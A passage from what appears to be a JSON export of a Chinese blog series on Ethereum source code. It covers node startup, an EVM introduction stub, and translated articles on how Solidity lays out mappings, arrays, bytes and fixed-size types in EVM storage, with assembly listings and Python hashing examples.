accounts.DefaultBaseDerivationPath)\n \n\t\t\t\tevent.Wallet.SelfDerive(derivationPaths, ethClient)\n \n\t\t\tcase accounts.WalletDropped:\n\t\t\t\tlog.Info(&quot;Old wallet dropped&quot;, &quot;url&quot;, event.Wallet.URL())\n\t\t\t\tevent.Wallet.Close()\n\t\t\t}\n\t\t}\n\t}()\n5.启动挖矿\nethereum.StartMining(threads)\n启动守护线程\nstop通道阻塞当前线程，直到节点被停止。\nnode.Wait()\n总结\n以太坊启动主要就做了3件事，包括加载配置注册服务、启动节点相关服务以及启动守护线程。\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM介绍-18":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM介绍-18","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM介绍-18.md","title":"死磕以太坊源码分析之EVM介绍-18","links":[],"tags":[],"content":"\n死磕以太坊源码分析之EVM介绍\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n目录结构\n\n|-opcodes.go 具体指令集的含义\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM动态数据类型-21":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM动态数据类型-21","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM动态数据类型-21.md","title":"死磕以太坊源码分析之EVM动态数据类型-21","links":[],"tags":[],"content":"\n死磕以太坊源码分析之EVM动态数据类型\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\nSolidity提供了在其他编程语言常见的数据类型。除了简单的值类型比如数字和结构体，还有一些其他数据类型，随着数据的增加可以进行动态扩展的动态类型。动态类型的3大类：\n\n映射(Mappings)：mapping(bytes32 =&gt; uint256)， mapping(address =&gt; string)等等\n数组(Arrays)：[]uint256，[]byte等等\n字节数组(Byte arrays)：只有两种类型：string，bytes\n\n在本系列的第二篇文章中我们看见了固定大小的简单类型在内存中的表示方式。\n\n基本数值：uint256，byte等等\n定长数组：[10]uint8，[32]byte，bytes32\n组合了上面类型的结构体\n\n固定大小的存储变量都是尽可能的打包成32字节的块然后依次存放在存储器中的。（如果这看起来很陌生，请阅读本系列的第二篇文章： 固定长度数据类型的表示方法\n在本文中我们将会研究Solidity是如何支持更加复杂的数据结构的。在表面上看可能Solidity中的数组和映射比较熟悉，但是从它们的实现方式来看在本质上却有着不同的性能特征。\n我们会从映射开始，这是三者当中最简单的。数组和字节数组其实就是拥有更加高级特征的映射。\n映射\n让我们存储一个数值在uint256 =&gt; uint256映射中：\npragma solidity ^0.4.11;\ncontract C {\n    mapping(uint256 =&gt; uint256) items;\n    function C() {\n      items[0xC0FEFE] = 0x42;\n    }\n}\n编译：\nsolc --bin --asm --optimize c-mapping.sol\n汇编代码：\ntag_2:\n  // 不做任何事情，应该会被优化掉\n  0xc0fefe\n  0x0\n  swap1\n  dup2\n  mstore\n  0x20\n  mstore\n  // 将0x42 存储在地址0x798...187c上\n  0x42\n 0x79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c\n  sstore\n我们可以将EVM想成一个键-值( key-value)数据库，不过每个key都限制为32字节。与其直接使用key0xC0FEFE，不如使用key的哈希值0x798...187c，并且0x42存储在这里。哈希函数使用的是keccak256(SHA256)函数。\n在这个例子中我们没有看见keccak256指令本身，因为优化器已经提前计算了结果并內联到了字节码中。在没什么作用的mstore指令中，我们依然可以看到计算的痕迹。\n计算地址\n使用一些Python代码来把0xC0FEFE哈希成0x798...187c。如果你想要跟着做下去，你需要安装Python 3.6，或者安装pysha3 来获得keccak_256哈希函数。\n定义两个协助函数：\nimport binascii\nimport sha3\n#将数值转换成32字节数组\ndef bytes32(i):\n    return binascii.unhexlify(&#039;%064x&#039; % i)\n# 计算32字节数组的 keccak256 哈希值\ndef keccak256(x):\n    return sha3.keccak_256(x).hexdigest()\n将数值转换成32个字节：\n&gt;&gt;&gt; bytes32(1)\nb&#039;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01&#039;\n&gt;&gt;&gt; bytes32(0xC0FEFE)\nb&#039;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc0\\xfe\\xfe&#039;\n使用+操作符，将两个字节数组连接起来：\n&gt;&gt;&gt; bytes32(1) + bytes32(2)\nb&#039;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02&#039;\n计算一些字节的 keccak256 哈希值：\n&gt;&gt;&gt; keccak256(bytes(1))\n&#039;bc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a&#039;\n现在我们可以计算0x798...187c了。\n存储变量items的位置是0x0（因为它是第一个存储变量）。连接key0xc0fefe和items的位置来获取地址：\n# key = 0xC0FEFE, position = 0\n&gt;&gt;&gt; keccak256(bytes32(0xC0FEFE) + bytes32(0))\n&#039;79826054ee948a209ff4a6c9064d7398508d2c1909a392f899d301c6d232187c&#039;\n为key计算存储地址的公式是：\nkeccak256(bytes32(key) + bytes32(position))\n两个映射\n我们先把公式放在这里，后面数值存储时需要计算会用到该公式。\n假设我们的合约有两个映射：\npragma solidity ^0.4.11;\ncontract C {\n    mapping(uint256 =&gt; uint256) itemsA;\n    mapping(uint256 =&gt; uint256) itemsB;\n    function C() {\n      itemsA[0xAAAA] = 0xAAAA;\n      itemsB[0xBBBB] = 0xBBBB;\n    }\n}\n\nitemsA的位置是0，key为0xAAAA：\n\n# key = 0xAAAA, position = 0\n&gt;&gt;&gt; keccak256(bytes32(0xAAAA) + bytes32(0))\n&#039;839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3&#039;\n\nitemsB的位置为1，key为0xBBBB：\n\n# key = 0xBBBB, position = 1\n&gt;&gt;&gt; keccak256(bytes32(0xBBBB) + bytes32(1))\n&#039;34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395&#039;\n用编译器来验证一下这些计算：\n$ solc --bin --asm --optimize  c-mapping-2.sol\n汇编代码：\ntag_2:\n  // ... 忽略可能会被优化掉的内存操作\n  0xaaaa\n  0x839613f731613c3a2f728362760f939c8004b5d9066154aab51d6dadf74733f3\n  sstore\n  0xbbbb\n  0x34cb23340a4263c995af18b23d9f53b67ff379ccaa3a91b75007b010c489d395\n  sstore\n跟期望的结果一样。\n汇编代码中的KECCAK256\n编译器可以提前计算key的地址是因为相关的值是常量。如果key使用的是变量，那么哈希就必须要在汇编代码中完成。现在我们无效化优化器，来看看在汇编代码中哈希是如何完成的。\n事实证明很容易就能让优化器无效，只要引入一个间接的虚变量i：\npragma solidity ^0.4.11;\ncontract C {\n    mapping(uint256 =&gt; uint256) items;\n    //这个变量会造成常量的优化失败\n    uint256 i = 0xC0FEFE;\n    function C() {\n      items[i] = 0x42;\n    }\n}\n变量items的位置依然是0x0，所以我们应该期待地址与之前是一样的。\n加上优化选项进行编译，但是这次不会提前计算哈希值：\n$ solc --bin --asm --optimize  c-mapping--no-constant-folding.sol\n注释的汇编代码：\ntag_2:\n  // 加载`i` 到栈中\n  sload(0x1)\n    [0xC0FEFE]\n  // 将key`0xC0FEFE`存放在内存中的0x0位置上，为哈希做准备\n  0x0\n    [0x0 0xC0FEFE]\n  swap1\n    [0xC0FEFE 0x0]\n  dup2\n    [0x0 0xC0FEFE 0x0]\n  mstore\n    [0x0]\n    memory: {\n      0x00 =&gt; 0xC0FEFE\n    }\n  // 将位置 `0x0` 存储在内存中的 0x20 (32)位置上，为哈希做准备\n  0x20 // 32\n    [0x20 0x0]\n  dup2\n    [0x0 0x20 0x0]\n  swap1\n    [0x20 0x0 0x0]\n  mstore\n    [0x0]\n    memory: {\n      0x00 =&gt; 0xC0FEFE\n      0x20 =&gt; 0x0\n    }\n // 从第0个字节开始，哈希在内存中接下来的0x40(64)个字节\n  0x40 // 64\n    [0x40 0x0]\n  swap1\n    [0x0 0x40]\n  keccak256\n    [0x798...187c]\n  // 将0x42 存储在计算的地址上\n  0x42\n    [0x42 0x798...187c]\n  swap1\n    [0x798...187c 0x42]\n  sstore\n    store: {\n      0x798...187c =&gt; 0x42\n    }\nmstore指令写入32个字节到内存中。内存操作便宜很多，只需要3 gas就可以读取和写入。前半部分的汇编代码就是通过将key和位置加载到相邻的内存块中来进行“连接”的：\n 0                   31  32                 63\n[    key (32 bytes)    ][ position (32 bytes) ]\n然后keccak256指令哈希内存中的数据。成本取决于被哈希的数据有多少：\n\n每个SHA3操作需要支付 30 gas\n每个32字节的字需要支付 6 gas\n\n对于一个uint256类型key，gas的成本是42：30 + 6 * 2。\n映射大数值\n每个存储槽只能存储32字节。如果我们尝试存储一个更大一点的结构体会怎么样？\npragma solidity ^0.4.11;\ncontract C {\n    mapping(uint256 =&gt; Tuple) tuples;\n    struct Tuple {\n      uint256 a;\n      uint256 b;\n      uint256 c;\n    }\n    function C() {\n      tuples[0x1].a = 0x1A;\n      tuples[0x1].b = 0x1B;\n      tuples[0x1].c = 0x1C;\n    }\n}\n编译，你会看见3个sstore指令：\ntag_2:\n  //忽略未优化的代码\n  0x1a\n  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7d\n  sstore\n  0x1b\n  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7e\n  sstore\n  0x1c\n  0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7f\n  sstore\n注意计算的地址除了最后一个数字其他都是一样的。Tulp结构体成员是依次排列的(..7d, ..7e, ..7f)。\n映射不会打包\n考虑到映射的设计方式，每项需要的最小存储空间是32字节，即使你实际只需要存储1个字节：\npragma solidity ^0.4.11;\ncontract C {\n    mapping(uint256 =&gt; uint8) items;\n    function C() {\n      items[0xA] = 0xAA;\n      items[0xB] = 0xBB;\n    }\n}\n如果一个数值大于32字节，那么你需要的存储空间会以32字节依次增加。\n动态数组是映射的升级\n在典型语言中，数组只是连续存储在内存中一系列相同类型的元素。假设你有一个包含100个uint8类型的元素数组，那么这就会占用100个字节的内存。这种模式的话，将整个数组加载到CPU的缓存中然后循环遍历每个元素会便宜一点。\n对于大多数语言而言，数组比映射都会便宜一些。不过在Solidity中，数组是更加昂贵的映射。数组里面的元素会按照顺序排列在存储器中：\n0x290d...e563\n0x290d...e564\n0x290d...e565\n0x290d...e566\n但是请记住，对于这些存储槽的每次访问实际上就像数据库中的key-value的查找一样。访问一个数组的元素跟访问一个映射的元素是没什么区别的。\n思考一下[]uint256类型，它本质上与mapping(uint256 =&gt; uint256)是一样的，只不过后者多了一点特征，让它看起去就像数组一样。\n\nlength表示一共有多少个元素\n边界检查。当读取或写入时索引值大于length就会报错\n比映射更加复杂的存储打包行为\n当数组变小时，自动清除未使用的存储槽\nbytes和string的特殊优化让短数组(小于32字节)存储更加高效\n\n简单数组\n看一下保存3个元素的数组：\n// c-darray.sol\npragma solidity ^0.4.11;\ncontract C {\n    uint256[] chunks;\n    function C() {\n      chunks.push(0xAA);\n      chunks.push(0xBB);\n      chunks.push(0xCC);\n    }\n}\n数组访问的汇编代码难以追踪，使用Remix调试器来运行合约：\n\n模拟的最后，我们可以看到有4个存储槽被使用了：\nkey: 0x0000000000000000000000000000000000000000000000000000000000000000\nvalue: 0x0000000000000000000000000000000000000000000000000000000000000003\nkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563\nvalue: 0x00000000000000000000000000000000000000000000000000000000000000aa\nkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564\nvalue: 0x00000000000000000000000000000000000000000000000000000000000000bb\nkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565\nvalue: 0x00000000000000000000000000000000000000000000000000000000000000cc\nchunks变量的位置是0x0，用来存储数组的长度（0x3），哈希变量的位置来找到存储数组数据的地址：\n# position = 0\n&gt;&gt;&gt; keccak256(bytes32(0))\n&#039;290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563&#039;\n在这个地址上数组的每个元素依次排列（0x29..63，0x29..64，0x29..65）。\n动态数据打包\n所有重要的打包行为是什么样的？数组与映射比较，数组的一个优势就是打包。拥有4个元素的uint128[]数组元素刚刚好需要2个存储槽（再加1个存储槽用来存储长度）。\n思考一下：\npragma solidity ^0.4.11;\ncontract C {\n    uint128[] s;\n    function C() {\n        s.length = 4;\n        s[0] = 0xAA;\n        s[1] = 0xBB;\n        s[2] = 0xCC;\n        s[3] = 0xDD;\n    }\n}\n在Remix中运行这个代码，存储器的最后看起来像这样：\nkey: 0x0000000000000000000000000000000000000000000000000000000000000000\nvalue: 0x0000000000000000000000000000000000000000000000000000000000000004\nkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563\nvalue: 0x000000000000000000000000000000bb000000000000000000000000000000aa\nkey: 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564\nvalue: 0x000000000000000000000000000000dd000000000000000000000000000000cc\n只有三个存储槽被使用了，跟预料的一样。长度再次存储在存储变量的0x0位置上。4个元素被打包放入两个独立的存储槽中。该数组的开始地址是变量位置的哈希值：\n# position = 0\n&gt;&gt;&gt; keccak256(bytes32(0))\n&#039;290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563&#039;\n现在的地址是每两个数组元素增加一次，看起来很好！\n但是汇编代码本身优化的并不好。因为使用了两个存储槽，所以我们会希望优化器使用两个sstore指令来完成任务。不幸的是，由于边界检查(和一些其他因素)，所以没有办法将sstore指令优化掉。\n使用4个sstore指令才能完成任务：\n/* &quot;c-bytes--sstore-optimize-fail.sol&quot;:105:116  s[0] = 0xAA */\nsstore\n/* &quot;c-bytes--sstore-optimize-fail.sol&quot;:126:137  s[1] = 0xBB */\nsstore\n/* &quot;c-bytes--sstore-optimize-fail.sol&quot;:147:158  s[2] = 0xCC */\nsstore\n/* &quot;c-bytes--sstore-optimize-fail.sol&quot;:168:179  s[3] = 0xDD */\nsstore\n字节数组和字符串\nbytes和string是为字节和字符进行优化的特殊数组类型。如果数组的长度小于31字节，只需要1个存储槽来存储整个数组。长一点的字节数组跟正常数组的表示方式差不多。\n看看短一点的字节数组：\n// c-bytes--long.sol\npragma solidity ^0.4.11;\ncontract C {\n    bytes s;\n    function C() {\n        s.push(0xAA);\n        s.push(0xBB);\n        s.push(0xCC);\n    }\n}\n因为数组只有3个字节（小于31字节），所以它只占用1个存储槽。在Remix中运行，存储看起来如下：\nkey: 0x0000000000000000000000000000000000000000000000000000000000000000\nvalue: 0xaabbcc0000000000000000000000000000000000000000000000000000000006\n数据0xaabbcc...从左到右的进行存储。后面的0是空数据。最后的0x06字节是数组的编码长度。公式是长度=编码长度/2，在这个例子中实际长度是6/2=3。\nstring与bytes的原理一模一样。\n长字节数组\n如果数据的长度大于31字节，字节数组就跟[]byte一样。来看一下长度为128字节的字节数组：\n// c-bytes--long.sol\npragma solidity ^0.4.11;\ncontract C {\n    bytes s;\n    function C() {\n        s.length = 32 * 4;\n        s[31] = 0x1;\n        s[63] = 0x2;\n        s[95] = 0x3;\n        s[127] = 0x4;\n    }\n}\n在Remix中运行，可以看见使用了4个存储槽：\n0x0000...0000\n0x0000...0101\n0x290d...e563\n0x0000...0001\n0x290d...e564\n0x0000...0002\n0x290d...e565\n0x0000...0003\n0x290d...e566\n0x0000...0004\n0x0的存储槽不再用来存储数据，整个存储槽现在存储编码的数组长度。要获得实际长度，使用长度=（编码长度-1）/2公式。在这个例子中长度是（0x101 - 1）/2=128。实际的字节被保存在0x290d...e563，并且存储槽是连续的。\n字节数组的汇编代码相当多。除了正常的边界检查和数组恢复大小等，它还需要对长度进行编码/解码，以及注意长字节数组和短字节数组之间的转换。\n\n为什么要编码长度？因为编码之后，可以很容易的测试出来字节数组是长还是短。注意对于长数组而言编码长度总是奇数，而短数组的编码长度总是偶数。汇编代码只需要查看一下最后一位是否为0，为0就是偶数（短数组），非0就是奇数（长数组）。\n\n总结\n查看Solidity编译器的内部工作，可以看见熟悉的数据结构例如映射和数组与传统编程语言完全不同。\n概括：\n\n数组跟映射一样，非高效\n比映射的汇编代码更加复杂\n小类型(byte，uint8，string)时存储比映射高效\n汇编代码优化的不是很好。即使是打包，每个任务都会有一个sstore指令\n\nEVM的存储器就是一个键值数据库，跟git很像。如果你改变了任一东西，根节点的校验和也会改变。如果两个根节点拥有相同的校验和，存储的数据就能保证是一样的。\n为了体会Solidity和EVM的奇特，可以想象一下在git仓库里数组里面的每个元素都是它自己的文件。当你改变数组里一个元素的值，实际上就相当于创建了一个提交。当你迭代一个数组时，你不能一次性的加载整个数组，你必须要到仓库中进行查找并分别找到每个文件。\n不仅仅这样，每个文件都限制到32字节！因为我们需要将数据结构都分割成32字节的块，Solidity编译器的所有逻辑和优化都是很负责的，全部在汇编的时候完成。\n不过32字节的限制是完全任意的。支持键值存储的可以使用key来存储任意类型的数值。也许未来我们添加新的EVM指令使用key来存储任意的字节数组。\n不过现在，EVM存储器就是一个伪装成32字节数组的键值数据库。\n\n可以看看ArrayUtils::resizeDynamicArray 来了解一下当恢复数组大小时编译器的动作。正常情况下数据结构都会作为语言的标准库来完成的，但是在Solidity中嵌入到了编译器里面。\n\n\n翻译自 medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM固定长度数据类型表示-20":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM固定长度数据类型表示-20","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM固定长度数据类型表示-20.md","title":"死磕以太坊源码分析之EVM固定长度数据类型表示-20","links":[],"tags":[],"content":"\n死磕以太坊源码分析之EVM固定长度数据类型表示\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n翻译自 medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7\n\n我们先看一个简单的Solidity合约的汇编代码：\ncontract C {\n    uint256 a;\n    function C() {\n      a = 1;\n    }\n}\n该合约归结于sstore指令的调用：\n// a = 1\nsstore(0x0, 0x1)\n\nEVM将0x1数值存储在0x0的位置上\n每个存储槽可以存储正好32字节(或256位)\n\n在本文中我们将会开始研究Solidity如何使用32字节的块来表示更加复杂的数据类型如结构体和数组。我们也将会看到存储是如何被优化的，以及优化是如何失败的。\n在典型编程语言中理解数据类型在底层是如何表示的没有太大的作用。但是在Solidity(或其他的EVM语言)中，这个知识点是非常重要的，因为存储的访问是非常昂贵的：\n\nsstore指令成本是20000 gas，或比基本的算术指令要贵~5000x\nsload指令成本是 200 gas，或比基本的算术指令要贵~100x\n\n这里说的成本，就是真正的金钱，而不仅仅是毫秒级别的性能。运行和使用合约的成本基本上是由sstore指令和sload指令来主导的！\nParsecs磁带上的Parsecs\n\n构建一个通用计算机器需要两个基本要素：\n\n一种循环的方式，无论是跳转还是递归\n无限量的内存\n\nEVM的汇编代码有跳转，EVM的存储器提供无限的内存。这对于一切就已经足够了，包括模拟一个运行以太坊的世界，这个世界本身就是一个模拟运行以太坊的世界…\nEVM的存储器对于合约来说就像一个无限的自动收报机磁带，磁带上的每个槽都能存储32个字节，就像这样：\n[32 bytes][32 bytes][32 bytes]...\n我们将会看到数据是如何在无限的磁带中生存的。\n\n磁带的长度是2²⁵⁶，或者每个合约~10⁷⁷存储槽。可观测的宇宙粒子数是10⁸⁰。大概1000个合约就可以容纳所有的质子、中子和电子。不要相信营销炒作，因为它比无穷大要短的多。\n\n空磁带\n存储器初始的时候是空白的，默认是0。拥有无限的磁带不需要任何的成本。\n以一个简单的合约来演示一下0值的行为：\npragma solidity ^0.4.11;\ncontract C {\n    uint256 a;\n    uint256 b;\n    uint256 c;\n    uint256 d;\n    uint256 e;\n    uint256 f;\n    function C() {\n      f = 0xc0fefe;\n    }\n}\n存储器中的布局很简单。\n\n变量a在0x0的位置上\n变量b在0x1的位置上\n以此类推…\n\n关键问题是：如果我们只使用f，我们需要为a，b，c，d，e支付多少成本？\n编译一下再看：\n$ solc --bin --asm --optimize c-many-variables.sol\n汇编代码：\n// sstore(0x5, 0xc0fefe)\ntag_2:\n  0xc0fefe\n  0x5\n  sstore\n所以一个存储变量的声明不需要任何成本，因为没有初始化的必要。Solidity为存储变量保留了位置，但是只有当你存储数据进去的时候才需要进行付费。\n这样的话，我们只需要为存储0x5进行付费。\n如果我们手动编写汇编代码的话，我们可以选择任意的存储位置，而用不着”扩展”存储器：\n// 编写一个任意的存储位置\nsstore(0xc0fefe, 0x42)\n读取零\n你不仅可以写在存储器的任意位置，你还可以立刻读取任意的位置。从一个未初始化的位置读取只会返回0x0。\n让我们看看一个合约从一个未初始化的位置a读取数据：\npragma solidity ^0.4.11;\ncontract C {\n    uint256 a;\n    function C() {\n      a = a + 1;\n    }\n}\n编译：\n$ solc --bin --asm --optimize c-zero-value.sol\n汇编代码：\ntag_2:\n  // sload(0x0) returning 0x0\n  0x0\n  dup1\n  sload\n  // a + 1; where a == 0\n  0x1\n  add\n  // sstore(0x0, a + 1)\n  swap1\n  sstore\n注意生成从一个未初始化的位置sload的代码是无效的。\n然而，我们可以比Solidity编译器聪明。既然我们知道tag_2是构造器，而且a从未被写入过数据，那么我们可以用0x0替换掉sload，以此节省5000 gas。\n结构体的表示\n来看一下我们的第一个复杂数据类型，一个拥有 6 个域的结构体：\npragma solidity ^0.4.11;\ncontract C {\n    struct Tuple {\n      uint256 a;\n      uint256 b;\n      uint256 c;\n      uint256 d;\n      uint256 e;\n      uint256 f;\n    }\n    Tuple t;\n    function C() {\n      t.f = 0xC0FEFE;\n    }\n}\n存储器中的布局和状态变量是一样的：\n\nt.a域在0x0的位置上\nt.b域在0x1的位置上\n以此类推…\n\n就像之前一样，我们可以直接写入t.f而不用为初始化付费。\n编译一下：\n$ solc --bin --asm --optimize c-struct-fields.sol\n然后我们看见一模一样的汇编代码：\ntag_2:\n  0xc0fefe\n  0x5\n  sstore\n固定长度数组\n让我们来声明一个定长数组：\npragma solidity ^0.4.11;\ncontract C {\n    uint256[6] numbers;\n    function C() {\n      numbers[5] = 0xC0FEFE;\n    }\n}\n因为编译器知道这里到底有几个uint256(32字节)类型的数值，所以它可以很容易让数组里面的元素依次存储起来，就像它存储变量和结构体一样。\n在这个合约中，我们再次存储到0x5的位置上。\n编译：\n$ solc --bin --asm --optimize c-static-array.sol\n汇编代码：\ntag_2:\n  0xc0fefe\n  0x0\n  0x5\ntag_4:\n  add\n  0x0\ntag_5:\n  pop\n  sstore\n这个稍微长一点，但是如果你仔细一点，你会看见它们其实是一样的。我们手动的来优化一下：\ntag_2:\n  0xc0fefe\n  // 0+5. 替换为0x5\n  0x0\n  0x5\n  add\n  // 压入栈中然后立刻出栈。没有作用，只是移除\n  0x0\n  pop\n  sstore\n移除掉标记和伪指令之后，我们再次得到相同的字节码序列：\ntag_2:\n  0xc0fefe\n  0x5\n  sstore\n数组边界检查\n我们看到了定长数组、结构体和状态变量在存储器中的布局是一样的，但是产生的汇编代码是不同的。这是因为Solidity为数组的访问产生了边界检查代码。\n让我们再次编译数组合约，这次去掉优化的选项：\n$ solc --bin --asm c-static-array.sol\n汇编代码在下面已经注释了，并且打印出每条指令的机器状态：\ntag_2:\n  0xc0fefe\n    [0xc0fefe]\n  0x5\n    [0x5 0xc0fefe]\n  dup1\n  /* 数组边界检查代码 */\n  // 5 &lt; 6\n  0x6\n    [0x6 0x5 0xc0fefe]\n  dup2\n    [0x5 0x6 0x5 0xc0fefe]\n  lt\n    [0x1 0x5 0xc0fefe]\n  // bound_check_ok = 1 (TRUE)\n  // if(bound_check_ok) { goto tag5 } else { invalid }\n  tag_5\n    [tag_5 0x1 0x5 0xc0fefe]\n  jumpi\n    // 测试条件为真，跳转到 tag_5.\n    //  `jumpi` 从栈中消耗两项数据\n    [0x5 0xc0fefe]\n  invalid\n// 数据访问有效，继续执行\n// stack: [0x5 0xc0fefe]\ntag_5:\n  sstore\n    []\n    storage: { 0x5 =&gt; 0xc0fefe }\n我们现在已经看见了边界检查代码。我们也看见了编译器可以对这类东西进行一些优化，但是不是非常完美。\n在本文的后面我们将会看到数组的边界检查是如何干扰编译器优化的，比起存储变量和结构体，定长数组的效率更低。\n打包行为\n存储是非常昂贵的。一个关键的优化就是尽可能的将数据打包成一个32字节数值。\n考虑一个有 4 个存储变量的合约，每个变量都是 64 位，全部加起来就是 256 位（32字节）：\npragma solidity ^0.4.11;\ncontract C {\n    uint64 a;\n    uint64 b;\n    uint64 c;\n    uint64 d;\n    function C() {\n      a = 0xaaaa;\n      b = 0xbbbb;\n      c = 0xcccc;\n      d = 0xdddd;\n    }\n}\n我们期望（希望）编译器使用一个sstore指令将这些数据存放到同一个存储槽中。\n编译：\n$ solc --bin --asm --optimize c-many-variables--packing.sol\n汇编代码：\ntag_2:\n    /* &quot;c-many-variables--packing.sol&quot;:121:122  a */\n  0x0\n    /* &quot;c-many-variables--packing.sol&quot;:121:131  a = 0xaaaa */\n  dup1\n  sload\n    /* &quot;c-many-variables--packing.sol&quot;:125:131  0xaaaa */\n  0xaaaa\n  not(0xffffffffffffffff)\n    /* &quot;c-many-variables--packing.sol&quot;:121:131  a = 0xaaaa */\n  swap1\n  swap2\n  and\n  or\n  not(sub(exp(0x2, 0x80), exp(0x2, 0x40)))\n    /* &quot;c-many-variables--packing.sol&quot;:139:149  b = 0xbbbb */\n  and\n  0xbbbb0000000000000000\n  or\n  not(sub(exp(0x2, 0xc0), exp(0x2, 0x80)))\n    /* &quot;c-many-variables--packing.sol&quot;:157:167  c = 0xcccc */\n  and\n  0xcccc00000000000000000000000000000000\n  or\n  sub(exp(0x2, 0xc0), 0x1)\n    /* &quot;c-many-variables--packing.sol&quot;:175:185  d = 0xdddd */\n  and\n  0xdddd000000000000000000000000000000000000000000000000\n  or\n  swap1\n  sstore\n这里还是有很多的位转移我没能弄明白，但是无所谓。最关键事情是这里只有一个sstore指令。\n这样优化就成功！\n干扰优化器\n优化器并不能一直工作的这么好。让我们来干扰一下优化器。唯一的改变就是使用协助函数来设置存储变量：\npragma solidity ^0.4.11;\ncontract C {\n    uint64 a;\n    uint64 b;\n    uint64 c;\n    uint64 d;\n    function C() {\n      setAB();\n      setCD();\n    }\n    function setAB() internal {\n      a = 0xaaaa;\n      b = 0xbbbb;\n    }\n    function setCD() internal {\n      c = 0xcccc;\n      d = 0xdddd;\n    }\n}\n编译：\n$ solc --bin --asm --optimize c-many-variables--packing-helpers.sol\n输出的汇编代码太多了，我们忽略了大多数的细节，只关注结构体：\n// 构造器函数\ntag_2:\n  // ...\n  // 通过跳到tag_5来调用setAB()\n  jump\ntag_4:\n  // ...\n  //通过跳到tag_7来调用setCD() \n  jump\n// setAB()函数\ntag_5:\n  // 进行位转移和设置a，b\n  // ...\n  sstore\ntag_9:\n  jump  // 返回到调用setAB()的地方\n//setCD()函数\ntag_7:\n  // 进行位转移和设置c，d\n  // ...\n  sstore\ntag_10:\n  jump  // 返回到调用setCD()的地方\n现在这里有两个sstore指令而不是一个。Solidity编译器可以优化一个标签内的东西，但是无法优化跨标签的。\n调用函数会让你消耗更多的成本，不是因为函数调用昂贵（他们只是一个跳转指令），而是因为sstore指令的优化可能会失败。\n为了解决这个问题，Solidity编译器应该学会如何內联函数，本质上就是不用调用函数也能得到相同的代码：\na = 0xaaaa;\nb = 0xbbbb;\nc = 0xcccc;\nd = 0xdddd;\n\n如果我们仔细阅读输出的完整汇编代码，我们会看见setAB()和setCD()函数的汇编代码被包含了两次，不仅使代码变得臃肿了，并且还需要花费额外的gas来部署合约。在学习合约的生命周期时我们再来谈谈这个问题。\n\n为什么优化器会被干扰？\n因为优化器不会跨标签进行优化。思考一下”1+1”，在同一个标签下，它会被优化成0x2:\n// 优化成功！\ntag_0:\n  0x1\n  0x1\n  add\n  ...\n但是如果指令被标签分开的话就不会被优化了：\n// 优化失败！\ntag_0:\n  0x1\n  0x1\ntag_1:\n  add\n  ...\n在0.4.13版本中上面的行为都是真实的。也许未来会改变。\n再次干扰优化器\n让我们看看优化器失败的另一种方式，打包适用于定长数组吗？思考一下：\npragma solidity ^0.4.11;\ncontract C {\n    uint64[4] numbers;\n    function C() {\n      numbers[0] = 0x0;\n      numbers[1] = 0x1111;\n      numbers[2] = 0x2222;\n      numbers[3] = 